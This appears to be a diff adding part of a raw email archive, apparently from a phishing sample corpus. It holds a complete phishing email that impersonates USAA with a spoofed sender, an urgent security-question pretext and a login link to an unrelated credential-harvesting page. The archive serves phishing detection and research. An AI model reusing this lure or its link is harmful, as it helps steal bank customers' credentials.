@@ -1,0 +1,81 @@
+From: "USAA" <usaa-IPDs@mail.mil>
+Date: Sat, 13 Feb 2016 18:44:57 -0500
+Return-Path: usaa-IPDs@mail.mil
+Message-ID: <EXCHANGE02C5EtrUVYK00000460@exchange02.managementpartners.com>
+X-OriginalArrivalTime: 13 Feb 2016 23:44:58.0507 (UTC) FILETIME=[8C5855B0:01D166B8]
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 72
+
+You will not see this in a MIME-aware mail reader.
+--===============0664713345==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+
+
+Dear USAA Member
+
+We are unable to verify your security questions and answers that
+was setup on your account and this can restrict your access to
+your account. We need you to login and update it immediately and
+also complete the IDP process.
+
+Click here to login now and update
+
+Don't hesitate to complete this to enjoy all USAA benefits available
+to all members.
+
+Sincerely
+
+USAA
+
+--===============0664713345==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<div id=3D"yui_3_16_0_1_1455399333267_10936" dir=3D"ltr"><div id=3D"yui_3_1=
+6_0_1_1455399333267_10935"><div id=3D"yui_3_16_0_1_1455399333267_10934"><di=
+v id=3D"yui_3_16_0_1_1455399333267_10933"><div id=3D"yui_3_16_0_1_145539933=
+3267_10932"><div id=3D"yui_3_16_0_1_1455399333267_10931"><a id=3D"yui_3_16_=
+0_1_1455399333267_10955" rel=3D"nofollow" target=3D"_blank" href=3D"https:/=
+/www.usaa.com/inet/ent_logon/Logon?EID=3D66659-0309_head"><img id=3D"yui_3_=
+16_0_1_1455399333267_10956" style=3D"margin-right:0px;" alt=3D"" src=3D"htt=
+ps://content.usaa.com/mcontent/static_assets/Media/email_logo.gif" height=
+=3D"83" border=3D"0" width=3D"123"></a><br><br></div>Dear USAA Member<br><b=
+r></div>We are unable to verify your security questions and answers that<br=
+></div>was setup on your account and this can restrict your access to<br></=
+div>your account. We need you to login and update it immediately and<br></d=
+iv><div id=3D"yui_3_16_0_1_1455399333267_10943">also complete the IDP proce=
+ss.<br><br></div><div id=3D"yui_3_16_0_1_1455399333267_10949"><a id=3D"yui_=
+3_16_0_1_1455399333267_10950" rel=3D"nofollow" target=3D"_blank" href=3D"ht=
+tps://cirrusemr.com/patients/images/rev.htm">Click here to login now and up=
+date</a><br><br></div><div id=3D"yui_3_16_0_1_1455399333267_10944">Don't he=
+sitate to complete this to enjoy all USAA benefits available<br></div><div =
+id=3D"yui_3_16_0_1_1455399333267_10945">to all members.<br><br></div><div i=
+d=3D"yui_3_16_0_1_1455399333267_10946">Sincerely<br><br></div><div id=3D"yu=
+i_3_16_0_1_1455399333267_10947">USAA<br></div></div>
+--===============0664713345==--
+
+From jose@monkey.org Sun Feb 14 01:57:01 2016 +0000
+Return-Path: bounces@bounces.newsletter.com.au
+Delivered-To: jose@monkey.org
+X-FDA: 71185392642.09.shake99_29878dd8de0c
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 53,3.2,0,cdfb0e2eb7d49a35,d41d8cd98f00b204,bounces@bounces.newsletter.com.au,:,RULES_HIT:2:41:46:72:150:152:355:379:474:495:527:800:904:962:967:969:973:978:983:988:989:1021:1189:1208:1221:1260:1263:1313:1314:1345:1381:1390:1430:1431:1432:1433:1434:1436:1437:1516:1517:1518:1535:1571:1575:1588:1589:1592:1594:1606:1676:1685:1710:1730:1744:1749:1769:1780:1792:1801:2107:2198:2199:2525:2527:2568:2610:2612:2628:2682:2685:2859:2890:2894:2900:2901:2902:2909:2924:2926:2933:2937:2939:2942:2945:2947:2951:2954:3000:3022:3138:3139:3140:3141:3142:3148:3352:3865:3866:3867:3868:3870:3872:3873:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4042:4118:4250:4321:4552:4605:4636:4886:5007:6117:6119:6261:6606:6650:6669:6671:6672:6674:6678:6688:7903:8516:8550:8583:8599:8603:8660:8885:8957:8960:8987:9025:9059:9072:9080:9149:9388:9411:9908:10008:10030:10049:10346:11026:11253:11639:11657:11658:11914:11984:12043:12292:12295:12324:12438:12517:12519:12555:12663:12682:12698:12737:12963:13007:1300
+X-HE-Tag: shake99_29878dd8de0c
+X-Filterd-Recvd-Size: 7356
+Received: from newslettersmtp1.syrahost.com (server-15-r2.ipv4.au.syrahost.com [103.250.213.41])
+	by imf14.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Sun, 14 Feb 2016 01:56:57 +0000 (UTC)
+Received: from newsletterjava2 (newsletterjava2.per.syra.net.au [203.170.85.176])
+	by newslettersmtp1.syrahost.com (Postfix) with ESMTPA id CAF1087FBC
+	for <jose@monkey.org>; Sun, 14 Feb 2016 09:56:55 +0800 (AWST)
+Message-Id: <14554150157845f504a3a-2d3b-4ce9-95be-3129393ef533@newsletter.com.au>
